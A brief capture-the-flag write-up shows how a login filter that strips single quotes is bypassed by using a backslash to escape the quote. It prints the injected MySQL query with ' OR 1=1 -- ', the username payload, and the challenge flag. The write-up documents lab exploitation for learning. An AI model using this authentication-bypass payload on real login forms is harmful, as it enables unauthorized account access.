## we have login page with buttoon to reveal source code 
![Screenshot 2023-08-11 at 05-45-49 Bypass The World](https://github.com/kiro6/writeups-ctfs/assets/57776872/2fabb0b8-c266-4adb-a830-5881be498343)

## the code replace `'` with space  , in mysql to escape char use `\` so we can escape the `'` in query ,the query will be like this 
```mysql
select * from useres where username = '\' and password = ' OR 1=1  -- '

# username value : \' and password =
```

## send the payload
![Screenshot_20230811_054601](https://github.com/kiro6/writeups-ctfs/assets/57776872/3759552b-90c5-4640-8575-bb67fc3ea8a6)

## we got the flag 
```
FLAG{Y0u_Ar3_S0_C00L_T0d4y}
```
